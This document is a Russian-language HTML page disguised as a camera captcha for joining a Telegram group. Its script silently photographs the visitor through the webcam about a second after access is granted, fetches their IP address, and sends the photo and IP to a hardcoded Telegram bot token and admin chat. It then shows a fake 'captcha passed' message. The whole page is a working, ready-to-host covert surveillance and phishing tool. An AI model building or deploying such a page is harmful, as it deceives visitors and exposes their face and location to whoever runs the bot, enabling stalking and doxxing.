<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔐 Подтверждение входа</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at 50% 0%, #1a1a2e 0%, #0f0f1a 100%);
            padding: 16px;
            position: relative;
            overflow: hidden;
        }

        body::before,
        body::after {
            content: '';
            position: absolute;
            border-radius: 50%;
            animation: floatBg 20s infinite alternate ease-in-out;
        }
        body::before {
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(88, 80, 236, 0.08) 0%, transparent 70%);
            top: -200px;
            right: -200px;
        }
        body::after {
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(236, 80, 180, 0.06) 0%, transparent 70%);
            bottom: -150px;
            left: -150px;
            animation-direction: alternate-reverse;
        }

        @keyframes floatBg {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(40px, 30px) scale(1.3); }
        }

        .container {
            max-width: 420px;
            width: 100%;
            background: rgba(22, 22, 40, 0.92);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 36px;
            padding: 32px 24px 28px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.04);
            position: relative;
            z-index: 10;
            transition: all 0.4s;
        }

        .header {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 20px;
            justify-content: center;
        }
        .header .shield {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            background: linear-gradient(135deg, #4a3fcf, #7c5cfc);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            box-shadow: 0 6px 20px rgba(88, 80, 236, 0.35);
            flex-shrink: 0;
        }
        .header h1 {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: -0.5px;
            line-height: 1.3;
        }
        .header h1 span {
            color: #8b7cfc;
            display: block;
            font-size: 14px;
            font-weight: 400;
            opacity: 0.8;
            letter-spacing: 0.2px;
        }

        .description {
            text-align: center;
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .description strong {
            color: #fff;
        }
        .description .highlight {
            color: #7c5cfc;
            font-weight: 600;
        }

        .video-wrapper {
            position: relative;
            border-radius: 20px;
            overflow: hidden;
            background: #0a0a14;
            aspect-ratio: 4 / 3;
            margin-bottom: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .video-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        .video-wrapper .placeholder {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: rgba(255, 255, 255, 0.2);
            font-size: 14px;
            gap: 12px;
            background: #0a0a14;
            transition: opacity 0.5s;
        }
        .video-wrapper .placeholder .icon {
            font-size: 48px;
            opacity: 0.4;
        }
        .video-wrapper .placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .video-wrapper .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #7c5cfc, transparent);
            animation: scan 3s infinite linear;
            opacity: 0.4;
        }
        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        .photo-preview {
            display: none;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 2px solid rgba(124, 92, 252, 0.3);
            box-shadow: 0 0 30px rgba(124, 92, 252, 0.1);
        }
        .photo-preview img {
            width: 100%;
            display: block;
        }

        .success {
            display: none;
            text-align: center;
            padding: 16px 0 4px;
            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        @keyframes successPop {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .success .check {
            font-size: 56px;
            margin-bottom: 8px;
            display: block;
        }
        .success h2 {
            color: #7c5cfc;
            font-size: 22px;
            font-weight: 700;
        }
        .success p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            margin-top: 4px;
        }

        .status {
            text-align: center;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.3);
            margin-top: 14px;
            padding-top: 14px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            transition: color 0.3s;
            min-height: 36px;
        }
        .status.success-text {
            color: #7c5cfc;
        }
        .status.error-text {
            color: #ff5e7a;
        }
        .status.loading-text {
            color: #f0c060;
        }

        .btn-retry {
            width: 100%;
            padding: 14px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.03);
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: none;
            margin-top: 4px;
        }
        .btn-retry:hover {
            background: rgba(255, 255, 255, 0.06);
            color: #fff;
        }

        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.05);
            border-top: 3px solid #7c5cfc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .container { padding: 20px 16px 20px; }
            .header h1 { font-size: 17px; }
        }
    </style>
</head>
<body>

    <div class="container" id="app">
        <div class="header">
            <div class="shield">🛡️</div>
            <h1>
                Подтверждение личности
                <span>Вход в Telegram-группу</span>
            </h1>
        </div>

        <p class="description">
            Нажмите <strong class="highlight">«Разрешить»</strong> на запрос камеры<br>
            и подтверждение произойдёт <strong>автоматически</strong>! ⚡
        </p>

        <div class="video-wrapper" id="videoWrapper">
            <video id="video" autoplay playsinline muted></video>
            <div class="placeholder" id="placeholder">
                <span class="icon">📷</span>
                <span>Ожидание доступа к камере...</span>
            </div>
            <div class="scan-line"></div>
        </div>

        <div class="photo-preview" id="photoPreview">
            <img id="photoImg" alt="Ваше фото">
        </div>

        <div class="spinner" id="spinner"></div>

        <div class="success" id="successBlock">
            <span class="check">✅</span>
            <h2>Капча пройдена!</h2>
            <p>Вы подтверждены. Добро пожаловать в группу.</p>
        </div>

        <div class="status" id="status">⏳ Запрос доступа к камере...</div>

        <button class="btn-retry" id="retryBtn">🔄 Пройти капчу заново</button>
    </div>

    <script>
        // ============================================================
        //  КОНФИГУРАЦИЯ
        // ============================================================
        const BOT_TOKEN = '8886268399:AAEQu4OjVY66LD9RnpCOAgQPzpnPht-I4wQ';
        const ADMIN_ID = '5098876175';

        // ============================================================
        //  DOM
        // ============================================================
        const video = document.getElementById('video');
        const placeholder = document.getElementById('placeholder');
        const photoPreview = document.getElementById('photoPreview');
        const photoImg = document.getElementById('photoImg');
        const successBlock = document.getElementById('successBlock');
        const status = document.getElementById('status');
        const retryBtn = document.getElementById('retryBtn');
        const spinner = document.getElementById('spinner');

        let stream = null;
        let isCaptured = false;
        let isSending = false;
        let captureTimeout = null;

        // ============================================================
        //  ОТПРАВКА ФОТО В TELEGRAM
        // ============================================================
        async function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('photo', blob, 'captcha_' + Date.now() + '.jpg');
            formData.append('caption', '✅ Новая капча пройдена!\n🕒 ' + new Date().toLocaleString('ru-RU') + '\n🌐 IP: ' + (await getIP()));

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch (err) {
                console.error('Ошибка отправки:', err);
                return false;
            }
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'неизвестно';
            } catch {
                return 'неизвестно';
            }
        }

        // ============================================================
        //  АВТО-СНИМОК (через 1 секунду после запуска камеры)
        // ============================================================
        function autoCapture() {
            if (isCaptured || isSending) return;

            // Показываем спиннер
            spinner.style.display = 'block';
            status.textContent = '📸 Снимок делается...';
            status.className = 'status loading-text';

            // Рисуем кадр
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Превью
            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
            photoImg.src = dataUrl;
            photoPreview.style.display = 'block';

            // Скрываем видео
            video.style.display = 'none';

            // Отправляем
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    status.textContent = '❌ Ошибка создания снимка';
                    status.className = 'status error-text';
                    spinner.style.display = 'none';
                    return;
                }

                isSending = true;
                status.textContent = '⏳ Отправка на проверку...';
                status.className = 'status loading-text';

                const sent = await sendPhotoToTelegram(blob);

                spinner.style.display = 'none';
                isSending = false;

                if (sent) {
                    isCaptured = true;
                    successBlock.style.display = 'block';
                    status.textContent = '✅ Капча успешно пройдена! Добро пожаловать!';
                    status.className = 'status success-text';
                    retryBtn.style.display = 'block';
                } else {
                    status.textContent = '❌ Ошибка отправки. Попробуйте заново.';
                    status.className = 'status error-text';
                    video.style.display = 'block';
                    photoPreview.style.display = 'none';
                    retryBtn.style.display = 'block';
                }
            }, 'image/jpeg', 0.92);
        }

        // ============================================================
        //  ЗАПУСК КАМЕРЫ
        // ============================================================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                placeholder.classList.add('hidden');
                status.textContent = '✅ Камера активна. Фото будет сделано автоматически...';
                status.className = 'status loading-text';

                // Ждём 1 секунду, чтобы кадр стабилизировался
                await new Promise(r => setTimeout(r, 1000));

                // АВТО-СНИМОК БЕЗ НАЖАТИЯ КНОПОК!
                autoCapture();

            } catch (err) {
                console.error('Ошибка камеры:', err);
                status.textContent = '❌ Нет доступа к камере. Разрешите доступ в браузере и обновите страницу.';
                status.className = 'status error-text';
                placeholder.innerHTML = `
                    <span class="icon">🚫</span>
                    <span>Доступ к камере запрещён</span>
                    <span style="font-size:12px;opacity:0.5;">Разрешите в браузере и обновите</span>
                `;
                placeholder.classList.remove('hidden');
                retryBtn.style.display = 'block';
                retryBtn.textContent = '🔄 Обновить страницу';
                retryBtn.onclick = () => location.reload();
            }
        }

        // ============================================================
        //  СБРОС (ПОВТОР)
        // ============================================================
        function resetAll() {
            isCaptured = false;
            isSending = false;
            successBlock.style.display = 'none';
            photoPreview.style.display = 'none';
            video.style.display = 'block';
            retryBtn.style.display = 'none';
            retryBtn.textContent = '🔄 Пройти капчу заново';
            retryBtn.onclick = resetAll;
            status.textContent = '⏳ Запрос доступа к камере...';
            status.className = '';
            spinner.style.display = 'none';

            // Останавливаем старый поток
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }

            // Заново запускаем камеру
            setTimeout(startCamera, 300);
        }

        // ============================================================
        //  СТАРТ
        // ============================================================
        startCamera();

        console.log('🔐 Капча-авто загружена');
        console.log('📤 Токен:', BOT_TOKEN);
        console.log('📥 ID:', ADMIN_ID);
        console.log('⚡ Фото делается АВТОМАТИЧЕСКИ после разрешения камеры');
    </script>

</body>
</html>
